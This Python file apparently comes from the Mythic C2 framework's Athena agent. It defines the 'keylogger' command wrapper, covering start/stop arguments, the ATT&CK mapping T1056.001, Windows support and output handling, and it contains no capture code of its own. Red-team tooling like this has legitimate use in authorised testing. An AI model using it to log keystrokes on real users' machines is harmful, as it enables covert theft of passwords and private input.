from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *

from .athena_utils import message_converter


class KeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                description="Start or Stop",
            )]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("action", self.command_line)
        else:
            self.add_arg("action","start")


class KeyloggerCommand(CommandBase):
    cmd = "keylogger"
    needs_admin = False
    help_cmd = "keylogger"
    description = "Start the keylogger"
    version = 1
    author = "@checkymander"
    attackmapping = ["T1056.001"]
    argument_class = KeyloggerArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        response.DisplayParams = taskData.args.get_arg("action")
        if taskData.args.get_arg("action") == "":
            taskData.args.add_arg("action", "start")

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
